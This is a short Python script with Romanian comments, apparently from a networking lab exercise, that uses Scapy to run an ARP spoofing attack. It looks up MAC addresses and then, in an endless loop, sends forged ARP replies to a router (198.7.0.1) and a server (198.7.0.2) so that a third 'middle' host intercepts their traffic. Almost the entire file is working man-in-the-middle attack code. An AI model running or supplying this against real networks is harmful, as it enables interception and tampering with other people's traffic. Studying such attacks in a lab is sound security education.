from scapy.all import *
import sys

#inspiratie de aici:
#geeksforgeeks.org/python-how-to-create-arp-spoofing-using-scapy

def get_mac(ip):
    """
    functie care ne da adresa MAC a unui dispozitiv conectat la retea
    sau None daca nu e conectat
    
    """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip):
    """
    il mintim pe target ip ca noi suntem de fapt hostul
    
    adica schimbam din tabela arp a targetului, mac-addres ul hostului cu al nostru
   
    """

    self_mac = ARP().hwsrc
    target_mac = get_mac(target_ip)

    print("target_mac:{0}", target_mac)

    # facem pachetul arp, adica un raspuns ARP
    # „hwsrc”=adresa MAC sursa?
    # nu schimbam hwsrc deoarece by default ea este adresa MAC reala a expeditorului (a noastra)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=self_mac)

    # trimitem pachetul arp
    # verbose = 0 inseamna ca trimitem fara sa afisam ceva
    # verbose = 1 inseamna ca afisam ce am trimis
    send(arp_response, verbose=1)
    print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def main():
    #intram intr o bucla de while si facm spoof intre:
    while True:
        # router(1) si server(2)
        spoof("198.7.0.1", "198.7.0.2")
        time.sleep(2)

        # server (2) si router(2)
        spoof("198.7.0.2", "198.7.0.1")
        time.sleep(2)
        
        #ACUM tabela arp va fi otravita si vor sti ambele middle(3)


main()
